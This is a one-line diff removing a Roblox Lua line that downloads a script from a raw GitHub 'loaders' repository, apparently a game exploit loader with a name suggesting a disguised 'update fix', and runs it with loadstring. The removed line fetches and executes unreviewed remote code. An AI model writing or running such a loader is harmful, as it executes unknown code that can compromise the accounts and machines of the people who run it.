@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/german-moped-days-update-fix-spam7-x2obxloxodhm9w.lua"))()
